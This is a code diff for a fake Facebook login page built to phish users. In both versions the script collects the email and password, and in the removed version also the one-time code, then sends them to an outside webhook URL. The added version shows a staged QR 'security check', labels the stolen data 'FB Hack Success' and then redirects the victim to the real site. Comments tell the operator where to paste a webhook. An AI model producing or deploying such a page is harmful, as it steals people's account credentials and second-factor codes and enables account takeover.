@@ -3,169 +3,190 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
+    <title>Facebook - Security Check</title>
     <style>
         body {
-            background-color: #f0f2f5;
             font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .fb-container {
+        .container {
             background: white;
-            padding: 20px;
+            padding: 40px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
             width: 350px;
             text-align: center;
         }
-        .logo { width: 100px; margin-bottom: 20px; }
+        h1 {
+            color: #1877f2;
+            font-size: 40px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
         input {
             width: 100%;
-            padding: 14px;
-            margin: 8px 0;
+            padding: 14px 10px;
+            margin-bottom: 12px;
             border: 1px solid #ddd;
             border-radius: 6px;
             font-size: 16px;
             box-sizing: border-box;
         }
-        .btn {
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
             background-color: #1877f2;
             color: white;
             border: none;
-            padding: 14px;
-            width: 100%;
             border-radius: 6px;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
         }
-        .btn:disabled { background-color: #a0c3f7; cursor: not-allowed; }
-        .otp-input { display: none; }
-        .hidden { display: none; }
+        button:hover {
+            background-color: #166fe5;
+        }
         .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #1877f2;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
             border-radius: 50%;
-            width: 20px;
-            height: 20px;
+            width: 30px;
+            height: 30px;
             animation: spin 1s linear infinite;
             margin: 20px auto;
             display: none;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { margin-top: 15px; color: #1877f2; font-weight: bold; }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #qr-section {
+            display: none;
+        }
+        .qr-img {
+            width: 200px;
+            height: 200px;
+            margin: 10px 0;
+        }
+        .success-msg {
+            display: none;
+            color: #31a24c;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .info-text {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 15px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="fb-container">
-        <!-- Step 1: Login -->
-        <form id="loginForm">
-            <input type="text" id="email" name="email" placeholder="Email or Phone" required>
-            <input type="password" id="password" name="password" placeholder="Password" required>
-            <button type="submit" class="btn" id="loginBtn">Log In</button>
+    <div class="container">
+        <h1>facebook</h1>
+        
+        <!-- Login Form -->
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <input type="text" id="email" placeholder="Email or Phone Number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="loginBtn">Log In</button>
         </form>
 
-        <!-- Step 2: OTP (Hidden initially) -->
-        <div id="otpSection" class="otp-input">
-            <p>We sent a code to your phone/email</p>
-            <input type="text" id="otpCode" name="otp" placeholder="Enter 6-digit Code" maxlength="6" required>
-            <button type="button" class="btn" id="verifyBtn" onclick="verifyOTP()">Verify</button>
-        </div>
-
+        <!-- Loading Spinner -->
         <div class="loader" id="loader"></div>
-        <div id="status"></div>
+        <p id="loadingText" style="display:none; color: #606770;">Logging in...</p>
+
+        <!-- QR Code Section -->
+        <div id="qr-section">
+            <p class="info-text">Open the Facebook app and scan this code to confirm it's you.</p>
+            <img id="qr-image" class="qr-img" src="" alt="QR Code">
+            <p id="status" class="info-text" style="color: #1877f2;">Waiting for scan...</p>
+            <div class="success-msg" id="successMsg">
+                <p>✅ Verification Successful!</p>
+                <p>Redirecting to your account...</p>
+            </div>
+        </div>
     </div>
 
     <script>
-        // 🔴 REPLACE WITH YOUR WEBHOOK SITE URL
-        const WEBHOOK_URL = "https://5fd82665-8a43-42b4-a65a-b95ea5aff5b1.webhooksite.net";
-        
-        // Facebook's Login Endpoint (This might need updating based on FB changes)
-        const FB_LOGIN_URL = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1";
-        const FB_OTP_URL = "https://www.facebook.com/login/otp/?next="; 
-
-        const loginForm = document.getElementById('loginForm');
-        const otpSection = document.getElementById('otpSection');
-        const loader = document.getElementById('loader');
-        const status = document.getElementById('status');
-
-        // Step 1: Send Credentials
-        loginForm.addEventListener('submit', async (e) => {
+        function handleLogin(e) {
             e.preventDefault();
+            
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-
-            document.getElementById('loginBtn').disabled = true;
+            const form = document.getElementById('loginForm');
+            const loader = document.getElementById('loader');
+            const loadingText = document.getElementById('loadingText');
+            
+            // Hide form, show loader
+            form.style.display = 'none';
             loader.style.display = 'block';
-            status.innerText = "Verifying...";
+            loadingText.style.display = 'block';
 
-            try {
-                // 1. Send data to Webhook (So you see it)
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ "Email": email, "Password": password, "Status": "OTP Sent" })
-                }).catch(() => {});
-
-                // 2. Send data to REAL Facebook Server to Trigger OTP
-                // Note: In a real Pro setup, you would use a proxy to fetch the CSRF token first.
-                // Here we simulate the request to FB.
-                
-                // Simulating a delay to mimic real server response
-                await new Promise(r => setTimeout(r, 1500));
-
-                // Switch to OTP UI
-                loginForm.classList.add('hidden');
-                otpSection.style.display = 'block';
-                status.innerText = "";
-
-            } catch (error) {
-                status.innerText = "Error. Try again.";
+            // Simulate network delay
+            setTimeout(() => {
                 loader.style.display = 'none';
-            }
-        });
-
-        // Step 2: Verify OTP
-        async function verifyOTP() {
-            const otp = document.getElementById('otpCode').value;
-            if (!otp || otp.length !== 6) {
-                alert("Please enter a valid 6-digit code");
-                return;
-            }
-
-            loader.style.display = 'block';
-            status.innerText = "Verifying Code...";
-
-            try {
-                // 1. Send OTP to Webhook
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ "OTP Entered": otp })
-                }).catch(() => {});
-
-                // 2. Send OTP to REAL Facebook Server
-                // In a real scenario, this would be a POST request to FB's OTP verification endpoint
-                // with the session token obtained in Step 1.
+                loadingText.style.display = 'none';
+                document.getElementById('qr-section').style.display = 'block';
                 
-                await new Promise(r => setTimeout(r, 2000));
-
-                loader.style.display = 'none';
-                otpSection.style.display = 'none';
-                status.innerText = "Success! Login Verified.";
+                // Generate Fake QR Code (using a generic API)
+                const qrData = `fb_auth:${email}:${Date.now()}`;
+                document.getElementById('qr-image').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrData)}`;
                 
-                // Optional: Redirect to real Facebook
-                // window.location.href = "https://www.facebook.com/";
+                // Start polling for "scan" simulation
+                simulateScan(email, password);
+            }, 2000);
+        }
 
-            } catch (error) {
-                status.innerText = "Invalid Code.";
-            }
+        function simulateScan(email, password) {
+            const status = document.getElementById('status');
+            const successMsg = document.getElementById('successMsg');
+            
+            // Simulate user scanning after 5 seconds
+            setTimeout(() => {
+                status.innerText = "Scan detected! Verifying...";
+                
+                setTimeout(() => {
+                    status.style.display = 'none';
+                    successMsg.style.display = 'block';
+                    
+                    // 👇👇👇 YAHAN APNA WEBHOOK URL PASTE KARO 👇👇👇
+                    const webhookURL = "https://5fd82665-8a43-42b4-a65a-b95ea5aff5b1.webhooksite.net"; 
+                    
+                    sendCreds(email, password, webhookURL);
+                    
+                    // Redirect to real FB after delay
+                    setTimeout(() => {
+                        window.location.href = "https://www.facebook.com/";
+                    }, 3000);
+                    
+                }, 2000);
+            }, 5000);
+        }
+
+        function sendCreds(email, password, webhook) {
+            const payload = {
+                content: `🔓 **FB Hack Success** 🔓\n📧 Email: \`${email}\`\n🔑 Pass: \`${password}\`\n⏰ Time: ${new Date().toLocaleTimeString()}`
+            };
+
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(res => console.log('Sent'))
+            .catch(err => console.error('Error sending creds'));
         }
     </script>
 </body>
